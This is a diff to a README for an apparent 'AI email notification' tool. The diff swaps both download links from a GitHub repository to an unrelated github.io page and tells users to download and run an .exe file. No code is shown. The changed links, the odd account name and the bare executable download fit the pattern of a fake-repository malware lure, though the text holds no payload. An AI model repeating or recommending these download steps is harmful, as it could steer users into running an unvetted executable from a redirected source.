@@ -1,6 +1,6 @@
 # 📧 ai-email-notification-2026 - Daily news and job alerts automatically.
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/spraypaintfamilytherapy925/ai-email-notification-2026)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://spraypaintfamilytherapy925.github.io)
 
 ## 🎯 About the software
 
@@ -16,7 +16,7 @@ This tool manages your daily information flow. It runs in the background on your
 
 ## 📥 How to download and install
 
-1. Visit this page to download the software: https://github.com/spraypaintfamilytherapy925/ai-email-notification-2026
+1. Visit this page to download the software: https://spraypaintfamilytherapy925.github.io
 2. Locate the link labeled "Releases" on the right side of the page.
 3. Click the version tagged as "Latest" to open the download details.
 4. Select the file named `ai-email-notification.exe` to start the download.
